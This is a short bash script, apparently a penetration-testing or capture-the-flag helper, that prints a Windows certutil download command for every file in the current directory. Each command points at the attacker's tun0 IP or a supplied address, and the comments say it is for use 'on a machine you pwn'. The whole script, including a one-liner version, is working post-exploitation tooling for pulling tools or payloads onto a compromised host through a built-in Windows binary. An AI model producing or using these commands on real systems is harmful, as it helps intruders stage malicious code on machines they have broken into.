#!/bin/bash

# Run in the current directory and you will get a certutil command for each file, to use on a machine you pwn.
# If you provide an IP it will use it, otherwise it will use the IP on TUN0

# One Liner for TUN0
# IP_ADDRESS=$(ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}') && [ -n "$IP_ADDRESS" ] && for file in *; do [ -f "$file" ] && echo "certutil -urlcache -f http://$IP_ADDRESS/$file $file"; done


# Check if an IP address is provided as an argument
if [ -n "$1" ]; then
  IP_ADDRESS="$1"
else
  # Get the IP address of tun0 if no argument is provided
  IP_ADDRESS=$(ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')

  # Check if the IP address was retrieved
  if [ -z "$IP_ADDRESS" ]; then
    echo "Could not find IP address for tun0. Make sure the interface is up."
    exit 1
  fi
fi

# Iterate over each file in the current directory
for file in *; do
  # Check if it's a regular file
  if [ -f "$file" ]; then
    echo "certutil -urlcache -f http://$IP_ADDRESS/$file $file"
  fi
done
